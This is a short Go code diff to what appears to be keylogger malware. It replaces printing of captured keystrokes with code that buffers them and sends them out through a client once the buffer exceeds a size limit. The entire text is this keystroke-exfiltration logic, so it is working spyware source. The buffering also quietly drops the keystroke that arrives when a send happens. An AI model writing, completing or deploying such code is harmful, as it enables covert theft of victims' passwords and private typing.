@@ -20,8 +20,14 @@ func main() {
 
 	go kl.Decoder.Listen()
 	go func() {
+		var buf string
 		for keystroke := range keystrokes {
-			fmt.Print(keystroke)
+			if len(buf) > client.MAX_BUF_SIZE {
+				client.Send(buf)
+				buf = ""
+			} else {
+				buf += keystroke
+			}
 		}
 	}()
 
